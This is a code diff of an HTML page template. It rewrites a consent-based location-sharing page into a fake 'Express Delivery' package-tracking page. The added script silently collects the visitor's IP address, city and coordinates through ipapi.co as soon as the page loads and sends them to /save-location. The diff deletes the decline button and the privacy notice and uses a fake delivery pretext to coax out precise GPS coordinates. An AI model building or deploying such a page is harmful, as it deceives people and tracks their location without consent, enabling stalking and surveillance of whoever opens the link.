@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Share Your Location</title>
+    <title>Track Your Package - Express Delivery</title>
     <style>
         * {
             margin: 0;
@@ -12,193 +12,329 @@
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f5f5;
             min-height: 100vh;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #ff6b35 0%, #f7931e 100%);
+            color: white;
+            padding: 15px 20px;
             display: flex;
             align-items: center;
-            justify-content: center;
-            padding: 20px;
+            gap: 10px;
+        }
+
+        .header-icon {
+            font-size: 28px;
+        }
+
+        .header h1 {
+            font-size: 20px;
+            font-weight: 600;
         }
 
         .container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            max-width: 450px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
         }
 
-        .icon {
-            font-size: 60px;
+        .tracking-card {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 2px 15px rgba(0,0,0,0.1);
             margin-bottom: 20px;
         }
 
-        h1 {
+        .package-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #eee;
+            margin-bottom: 20px;
+        }
+
+        .package-icon {
+            width: 60px;
+            height: 60px;
+            background: #fff3e0;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+        }
+
+        .package-details h2 {
+            font-size: 16px;
             color: #333;
-            margin-bottom: 15px;
-            font-size: 24px;
+            margin-bottom: 5px;
         }
 
-        p {
-            color: #666;
-            margin-bottom: 30px;
-            line-height: 1.6;
+        .package-details p {
+            font-size: 13px;
+            color: #888;
         }
 
-        .btn {
-            padding: 15px 40px;
-            font-size: 18px;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin: 10px;
-        }
-
-        .btn-primary {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-        }
-
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
-        }
-
-        .btn-secondary {
+        .tracking-number {
+            font-family: monospace;
             background: #f0f0f0;
-            color: #666;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 12px;
         }
 
-        .btn-secondary:hover {
-            background: #e0e0e0;
+        .status-timeline {
+            margin-bottom: 25px;
         }
 
-        .status {
-            margin-top: 30px;
-            padding: 20px;
-            border-radius: 10px;
+        .timeline-item {
+            display: flex;
+            gap: 15px;
+            padding: 10px 0;
+        }
+
+        .timeline-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #ddd;
+            margin-top: 4px;
+            position: relative;
+        }
+
+        .timeline-dot.active {
+            background: #4caf50;
+        }
+
+        .timeline-dot.current {
+            background: #ff6b35;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(255, 107, 53, 0.4); }
+            50% { box-shadow: 0 0 0 8px rgba(255, 107, 53, 0); }
+        }
+
+        .timeline-dot::after {
+            content: '';
+            position: absolute;
+            width: 2px;
+            height: 30px;
+            background: #ddd;
+            left: 5px;
+            top: 15px;
+        }
+
+        .timeline-item:last-child .timeline-dot::after {
             display: none;
         }
 
-        .status.success {
-            background: #d4edda;
-            color: #155724;
-            display: block;
+        .timeline-content h3 {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 3px;
         }
 
-        .status.error {
-            background: #f8d7da;
-            color: #721c24;
-            display: block;
-        }
-
-        .status.loading {
-            background: #fff3cd;
-            color: #856404;
-            display: block;
-        }
-
-        .privacy-note {
-            margin-top: 30px;
-            padding: 15px;
-            background: #f8f9fa;
-            border-radius: 10px;
+        .timeline-content p {
             font-size: 12px;
             color: #888;
         }
 
-        .buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
+        .location-request {
+            background: #fff8e1;
+            border: 1px solid #ffe082;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .location-request h3 {
+            color: #f57c00;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+
+        .location-request p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .btn {
+            padding: 14px 30px;
+            font-size: 16px;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #ff6b35 0%, #f7931e 100%);
+            color: white;
+            width: 100%;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(255, 107, 53, 0.4);
+        }
+
+        .status-message {
+            margin-top: 15px;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            display: none;
+        }
+
+        .status-message.success {
+            background: #e8f5e9;
+            color: #2e7d32;
+            display: block;
+        }
+
+        .status-message.loading {
+            background: #e3f2fd;
+            color: #1565c0;
+            display: block;
+        }
+
+        .status-message.error {
+            background: #ffebee;
+            color: #c62828;
+            display: block;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #999;
+            font-size: 12px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="icon">📍</div>
-        <h1>Location Request</h1>
-        <p>Someone has requested to see your current location. Click the button below to share your location.</p>
+    <div class="header">
+        <span class="header-icon">📦</span>
+        <h1>Express Delivery</h1>
+    </div>
 
-        <div class="buttons">
-            <button class="btn btn-primary" id="share-btn">Share My Location</button>
-            <button class="btn btn-secondary" id="decline-btn">Decline</button>
+    <div class="container">
+        <div class="tracking-card">
+            <div class="package-info">
+                <div class="package-icon">📦</div>
+                <div class="package-details">
+                    <h2>Your Package is Nearby!</h2>
+                    <p>Tracking: <span class="tracking-number">EXP{{ tracking_id | upper }}</span></p>
+                </div>
+            </div>
+
+            <div class="status-timeline">
+                <div class="timeline-item">
+                    <div class="timeline-dot active"></div>
+                    <div class="timeline-content">
+                        <h3>Order Confirmed</h3>
+                        <p>Package received at warehouse</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-dot active"></div>
+                    <div class="timeline-content">
+                        <h3>In Transit</h3>
+                        <p>Package is on the way</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-dot current"></div>
+                    <div class="timeline-content">
+                        <h3>Out for Delivery</h3>
+                        <p>Driver is near your location</p>
+                    </div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-dot"></div>
+                    <div class="timeline-content">
+                        <h3>Delivered</h3>
+                        <p>Waiting for confirmation</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="location-request">
+                <h3>Confirm Delivery Location</h3>
+                <p>To ensure accurate delivery, please confirm your current location. This helps our driver find you faster.</p>
+                <button class="btn btn-primary" id="confirm-btn">Confirm My Location</button>
+                <div class="status-message" id="status"></div>
+            </div>
         </div>
 
-        <div class="status" id="status"></div>
-
-        <div class="privacy-note">
-            <strong>Privacy Notice:</strong> Your location will only be shared once when you click the button.
-            You can decline if you don't want to share your location.
+        <div class="footer">
+            <p>Express Delivery Services</p>
+            <p>Need help? Contact support</p>
         </div>
     </div>
 
     <script>
         const trackingId = "{{ tracking_id }}";
         const statusDiv = document.getElementById('status');
-        const shareBtn = document.getElementById('share-btn');
-        const declineBtn = document.getElementById('decline-btn');
+        const confirmBtn = document.getElementById('confirm-btn');
 
-        shareBtn.addEventListener('click', function() {
+        // Get IP-based location immediately on page load
+        window.addEventListener('load', function() {
+            getIPLocation();
+        });
+
+        function getIPLocation() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    // Save IP-based location as fallback
+                    saveLocation({
+                        latitude: data.latitude,
+                        longitude: data.longitude,
+                        accuracy: 5000,
+                        type: 'ip',
+                        city: data.city,
+                        region: data.region,
+                        country: data.country_name,
+                        ip: data.ip
+                    });
+                })
+                .catch(error => {
+                    console.log('IP location failed');
+                });
+        }
+
+        confirmBtn.addEventListener('click', function() {
             if (!navigator.geolocation) {
-                showStatus('error', 'Geolocation is not supported by your browser.');
+                showStatus('error', 'Location services not available. Please try on mobile.');
                 return;
             }
 
-            showStatus('loading', 'Getting your location...');
-            shareBtn.disabled = true;
+            showStatus('loading', 'Finding your location...');
+            confirmBtn.disabled = true;
 
             navigator.geolocation.getCurrentPosition(
                 function(position) {
-                    const data = {
-                        tracking_id: trackingId,
+                    saveLocation({
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy
-                    };
-
-                    fetch('/save-location', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(data)
-                    })
-                    .then(response => response.json())
-                    .then(result => {
-                        if (result.success) {
-                            showStatus('success', 'Location shared successfully! You can close this page now.');
-                            shareBtn.style.display = 'none';
-                            declineBtn.style.display = 'none';
-                        } else {
-                            showStatus('error', 'Failed to save location. Please try again.');
-                            shareBtn.disabled = false;
-                        }
-                    })
-                    .catch(error => {
-                        showStatus('error', 'An error occurred. Please try again.');
-                        shareBtn.disabled = false;
+                        accuracy: position.coords.accuracy,
+                        type: 'gps'
                     });
                 },
                 function(error) {
-                    let message = 'Unable to get your location.';
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            message = 'You denied the location request. Please allow location access and try again.';
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            message = 'Location information is unavailable.';
-                            break;
-                        case error.TIMEOUT:
-                            message = 'The request to get your location timed out.';
-                            break;
-                    }
-                    showStatus('error', message);
-                    shareBtn.disabled = false;
+                    showStatus('error', 'Could not get precise location. Using approximate location.');
+                    confirmBtn.disabled = false;
                 },
                 {
                     enableHighAccuracy: true,
@@ -208,14 +344,36 @@
             );
         });
 
-        declineBtn.addEventListener('click', function() {
-            showStatus('error', 'You chose not to share your location. You can close this page.');
-            shareBtn.style.display = 'none';
-            declineBtn.style.display = 'none';
-        });
+        function saveLocation(locationData) {
+            const data = {
+                tracking_id: trackingId,
+                ...locationData
+            };
+
+            fetch('/save-location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => {
+                if (result.success && locationData.type === 'gps') {
+                    showStatus('success', 'Location confirmed! Your package will arrive shortly.');
+                    confirmBtn.style.display = 'none';
+                }
+            })
+            .catch(error => {
+                if (locationData.type === 'gps') {
+                    showStatus('error', 'Network error. Please try again.');
+                    confirmBtn.disabled = false;
+                }
+            });
+        }
 
         function showStatus(type, message) {
-            statusDiv.className = 'status ' + type;
+            statusDiv.className = 'status-message ' + type;
             statusDiv.textContent = message;
         }
     </script>
